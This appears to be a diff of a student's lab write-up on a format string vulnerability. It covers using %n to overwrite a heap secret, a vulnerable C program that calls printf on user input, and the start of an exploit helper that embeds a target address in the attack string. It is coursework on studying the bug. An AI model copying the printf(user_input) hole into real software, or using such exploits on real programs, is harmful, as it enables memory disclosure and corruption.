@@ -29,7 +29,7 @@ Slightly different, but the provided address for secret[1] can be used to print 
 
 ### Modify value of `secret[1]`
 
-The `%n` format string will overwrite the values that are stored at the location of secret[1]. These values are determined by what has already been written. This can be seen below.
+The `%n` format string will overwrite the values that are stored at the location of secret[1] with the number of characters that were written before it. This can be seen below.
 
 Nothing written before the `%n`.
 ![Task 1 Modify](printf_task1_modify.png)
@@ -39,4 +39,72 @@ Two characters written before `%n`: H I.
 
 ## Task 2: Memory randomization
 
-> Note: I turned off memory randomization for the previous step as to make the behavior of the program more consistent. For the following steps it will remain off and for the final step I will turn if off and repeat the "show secret[1]" step.
+> Note: I turned off memory randomization for the previous step as to make the behavior of the program more consistent.
+
+Commenting out `scanf(...)` in vul_prog.c :
+
+``` C
+int main(int argc, char *argv[])
+{
+    char user_input[100];
+    int *secret;
+    int int_input;
+    int b, c, d; /* other variables, not used here.*/
+
+    // we need to take up space so that we have a nice offset
+    // to easily find the desired address
+    // pretty much the same role as we did in the first part of the lab
+    int a = 134524940;
+
+    /* The secret value is stored on the heap */
+    secret = (int *) malloc(2*sizeof(int));
+    /* getting the secret */
+    secret[0] = SECRET1; secret[1] = SECRET2;
+
+    printf("The variable secret's address is 0x%8x (on stack)\n", (unsigned int)&secret);
+    printf("The variable secret's value is 0x%8x (on heap)\n", (unsigned int)secret);
+    printf("secret[0]'s address is 0x%8x (on heap)\n", (unsigned int)&secret[0]);
+    printf("secret[1]'s address is 0x%8x (on heap)\n", (unsigned int)&secret[1]);
+
+//    printf("Please enter a decimal integer\n");
+//    scanf("%d", &int_input);  /* getting an input from user */
+    printf("Please enter a string\n");
+    scanf("%s", user_input); /* getting a string from user */
+
+    /* Vulnerable place */
+    printf(user_input);
+    printf("\n");
+
+    /* Verify whether your attack is successful */
+    printf("The original secrets: 0x%x -- 0x%x\n", SECRET1, SECRET2);
+    printf("The new secrets:      0x%x -- 0x%x\n", secret[0], secret[1]);
+    return 0;
+}
+
+```
+
+Desired Address in write_string.c :
+
+```C
+int main()
+{
+    char buf[1000];
+    int fp, size;
+    unsigned int *address;
+
+    /* Putting any number you like at the beginning of the format string */
+    address = (unsigned int *) buf;
+    *address = 0x804b00c; // The address found from running vul_prog
+```
+
+As can be seen below, the string that was specified in the "mystring" text file was passed into the `vul_prog` and secret[1] value is shown. This is done by using the `int a` to allocate some empty space, much like what we did in the first part of the lab.
+
+We set its value to be the decimal representation of the desired address' hex. This created the desired offset and thereby letting us find and access the data at secret[1].
+
+No user integer input:
+![Task 2 No Int](printf_task2_noInputFind.png)
+
+## Sources
+
+https://www.youtube.com/watch?v=df5P5DiBLng&feature=youtu.be
+https://stackoverflow.com/questions/16067427/accessing-2nd-element-of-an-array-in-a-format-string-vulnerability-attack
